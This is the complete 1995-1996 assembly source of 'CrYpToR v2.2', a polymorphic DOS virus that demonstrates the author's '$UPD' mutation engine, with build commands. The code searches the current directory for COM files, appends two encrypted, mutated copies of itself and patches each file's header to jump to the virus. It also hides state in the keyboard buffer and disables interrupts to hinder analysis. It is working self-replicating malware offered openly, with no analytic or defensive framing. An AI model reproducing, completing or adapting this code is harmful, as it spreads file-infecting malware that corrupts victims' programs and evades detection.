;-------------------- Welcome-to ------------------------;
; [$UPDû2.2], $pirit's Universal Polymorphic Device v2.2 ;
;           (C)1995-1996 by ÄNighÅÄ$piriÅÄ		 ;
;--------------------------------------------------------;
; Must compile with:					 ;
;  tasm $updviri.asm /m					 ;
;  tlink $updviri.obj $upd22.obj, $updviri.com /x /t	 ;
; or use makeviri.bat for rapidly do this		 ;
;--------------------------------------------------------;

; Polymorphic [$UPDû2.2] based CrYpToR.5229 virii (demo version 2.2)
; Non-resident, infect only COM files in current directory,
; display image before start infecting

.MODEL Tiny
JUMPS
.CODE

	org	100h
	extrn	$UPD:near
	extrn	$UPD_Top:near

EndOfVir	equ	$UPD_Top+16
Virus_Length	equ	EndOfVir-Offset VStart
CF		equ	0dh,0ah

; This code emulate infected program
; It show our messages/copyrights

Start:
	jmp	Dummy_Decoder	; Jump at dummy decoder
	db	?,'$'		; Our mark (byte '$')

	lea	si,Msg
	call	Show_String
	retn			; DOS Exit

Dummy_Decoder:
	in	al,21h		; Disable IRQs: 1,3,4
	or	al,1ah
	out	21h,al

	mov	bx,9090h	; Savge part of it's file header into stack...
	push	bx

	mov	cx,0090h
	mov	ah,5
	int	16h		; ...and part into keyboard buffer
	int	16h
	jmp	VStart		; Jump at virii body

Msg	db	'[$UPDû2.2], $pirit''s Universal Polymorphic Device (virii demo)'
	db	CF,'(C)1995-1996 by ÄNighÅÄ$piriÅÄ',CF,CF
	db	'This file contain CrYpToR v2.2 demo virii:',CF
	db	' þ Strong polymorphic, non-resident COM infector',CF
	db	' þ Polymorphic encryptor/decryptor is [$UPDû2.2] based',CF
	db	' þ Warning! This is demo only (not for public release) virii'
	db	CF,0

; Hehehe... Virii body start

VStart:
	cld			; Calculate flowing offset
	call	Define_Ofs
Remainder	=	$

; Procedure shows ASCIIZ-string at ds:[si]
; Return: ax,dx,si=?

Show_String	proc	near

	mov	ah,2

Repeat_Show_String:
	lodsb
	test	al,al
	jz	EOS
	mov	dl,al
	int	21h
	jmp	Repeat_Show_String

EOS:
	retn

Show_String	endp

Destroy_Our_Code_&_Exit	proc	near

	repnz	stosb		; Wipe down our code

	in	al,21h		; Enable IRQs
	and	al,0e5h
	out	21h,al

	mov	ax,100h		; Return to begining of file
	jmp	ax

Destroy_Our_Code_&_Exit	endp

ViriiID	db	'-=ðCrYpToR v2.2ð=- (C)1996 by ÄNighÅÄ$piriÅÄ '
	db	'þ BEST POLYMORPH-ENCRYPT VIRII þ',CF,CF,0

include	c00l.inc

Define_Ofs:			; ds=es=cs (because of we in COM file)
	pop	bp
	sub	bp,Offset Remainder

	call	Display_Image
	lea	si,[bp+ViriiID]
	call	Show_String

	mov	ah,2fh		; Get old DTA placing
	int	21h
	mov	word ptr [bp+Old_DTA],es
	mov	word ptr [bp+Old_DTA+2],bx

	push	ds		; Now ds and es are equal to cs
	pop	es

	mov	ah,1ah		; Set own DTA
	lea	dx,[bp+DTA_Area]
	int	21h

	sub	ax,ax		; Restore second part of our header from buffer
	int	16h
	mov	dl,al
	sub	ax,ax
	int	16h
	mov	dh,al
	mov	word ptr ds:[102h],dx

	mov	ah,4eh		; Find first matching file
	mov	cx,20h		; Attribute 
	lea	dx,[bp+Target]
	int	21h
	jc	ExitVir

Infect:	
	mov	ax,3d02h	; Open file for I/O
	lea	dx,[bp+DTA_Area+1eh]
	int	21h

	mov	bx,ax
	
	mov	ah,3fh		; Read four bytes from begining
	mov	cx,4
	lea	dx,[bp+Old_Header]
	int	21h
	
	cmp	byte ptr [bp+Old_Header+3],'$'
	je	Error		; Check for twice infection

	mov	ax,4202h	; Go to end of file
	xor	dx,dx
	xor	cx,cx
	int	21h

	or	dx,dx		; Don't infrect files with size above 50000b
	jnz	Error		; or below 1000b
	cmp	ax,41800	; Remember, that we make TWO polimorphic copies,
	ja	Error		; so we need 3*Virus_Length+5*1300) bytes of
	cmp	ax,1000		; free memory => highest file length must be
	jb	Error		; 64000-5*1300-3*Virus_Length÷41800 bytes

	sub	ax,3
	mov	word ptr [bp+New_Header+1],ax

	push	bx

	lea	si,[bp+VStart]	; Creating first polymorphic copy with $UPD
	lea	di,[bp+EndOfVir]; engine
	mov	ah,00001110b	; Don't use int 21h generations, disable IRQs,
				; give key value (old hdr) in bx & dx (see dox):
	xchg	bx,word ptr cs:[bp+Old_Header]	 ; get throught stack
	xchg	dx,word ptr cs:[bp+Old_Header+2] ; get throught keyboard buffer
	mov	cx,Virus_Length
	call	$UPD
	pop	bx

	mov	si,di		; Creating second copy with $UPD - cool!
	add	di,cx
	add	di,16		; <- You can skip it, but who knows ... ;-)
	mov	ah,1		; Use only int 21h generations
	call	$UPD

	mov	ah,40h		; [di] contain second encrypted copy, cx - size
	mov	dx,di		; So, we can infect owr client ;)
	int	21h

	mov	ax,4200h	; Goto begining of file
	sub	cx,cx
	sub	dx,dx
	int	21h

	mov	ah,40h		; Save new header with jump to virii
	mov	cx,4		; body
	lea	dx,[bp+New_Header]
	int	21h

Error:				; |~(
	mov	ah,3eh		; Close infected file
	int	21h

	mov	ah,4fh		; Find next matching file
	int	21h
	jnc	Infect

ExitVir:
	mov	ds,word ptr [bp+Old_DTA]	; Restore DTA address
	mov	dx,word ptr [bp+Old_DTA+2]
	mov	ah,1ah
	int	21h

	push	cs
	pop	ds

	pop	bx		; Restore old file header ;)))
	mov	word ptr ds:[100h],bx
	xor	bx,bx		; Return bx=0 as DOS it do

	lea	di,[bp+ViriiID]	; Beginning of wiping code
	mov	cx,0f000h	; Clear all segment after ViriiID
	sub	cx,di		; Wipe all segment after ViriiID label
	sub	ax,ax		; by empty bytes

	jmp	Destroy_Our_Code_&_Exit

Target		db	'*.COM',0
Old_DTA		dd	?
DTA_Area	db	2bh dup(?)
New_Header	db	0e9h,0,0,'$'
Old_Header	db	4 dup (?)

	end	Start
